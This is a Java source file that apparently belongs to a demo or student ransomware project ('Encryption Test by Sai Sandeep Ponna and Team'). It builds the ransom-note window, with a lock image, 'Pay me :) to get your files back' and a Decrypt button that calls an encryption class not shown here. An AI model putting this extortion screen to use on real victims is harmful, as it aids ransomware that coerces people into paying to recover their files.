

package RansomeWare;

import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.text.Font;
import javafx.scene.text.FontWeight;
import javafx.scene.text.Text;
import javafx.scene.text.TextAlignment;
import javafx.stage.Stage;


public class TakeOver extends Application {

    @Override
    public void start(Stage primaryStage) {
        primaryStage.setTitle("Java RansomWare");

        GridPane grid = new GridPane();
        grid.setAlignment(Pos.CENTER);
        grid.setHgap(10);
        grid.setVgap(10);
//        grid.setStyle("-fx-background-image: url('https://i.ibb.co/Sc7BvhL/background.png');");
        grid.setStyle("-fx-background-image: url('https://i.ibb.co/G596HPx/cybersecurity-ge3ad1b7e1-1920.png');");
        Scene scene = new Scene(grid, 1200, 800);
        primaryStage.setScene(scene);

        GridPane g = new GridPane();
        grid.setAlignment(Pos.TOP_CENTER);
        grid.setHgap(0);
        grid.setVgap(0);

        Image lock = new Image("https://i.ibb.co/fDDZ26F/lock.png");
        ImageView lockView = new ImageView();
        lockView.setFitHeight(300);
        lockView.setFitWidth(300);
        lockView.setImage(lock);
        g.add(lockView, 2, 0, 1, 1);
        grid.add(g, 0,0);

        GridPane gridPane = new GridPane();
        gridPane.setAlignment(Pos.CENTER);
        gridPane.setStyle("-fx-background-color: white;");
        gridPane.setHgap(30);
        gridPane.setVgap(30);


        grid.add(gridPane, 0,1);



        Text scenetitle = new Text("Encryption Test by Sai Sandeep Ponna and Team");
        scenetitle.setFont(Font.font("Tahoma", FontWeight.EXTRA_BOLD, 40));
        scenetitle.setFill(Color.RED);
        scenetitle.setTextAlignment(TextAlignment.CENTER);
        scenetitle.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(scenetitle, 0,1);


        Text description = new Text("Pay me :)");
        description.setFont(Font.font("Tahoma", FontWeight.BOLD, 15));
        description.setTextAlignment(TextAlignment.CENTER);
        description.baselineOffsetProperty();
        description.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(description, 0,3);

        Text address = new Text("to get your files back");
        address.setFont(Font.font("Tahoma", FontWeight.BOLD, 20));
        address.setTextAlignment(TextAlignment.CENTER);
        address.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(address, 0,4);



        EventHandler<ActionEvent> event = new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent actionEvent) {
                try {
                    JavaWare jw = new JavaWare();
                    jw.DecryptFiles();
                } catch(Exception e) {

                }
            }
        };

        Button b = new Button("Decrypt");

        gridPane.add(b, 3, 8);
        b.setOnAction(event);
        
//        primaryStage.setScene(new Scene(gridPane,500,500));

        primaryStage.show();
        
   
    }
}
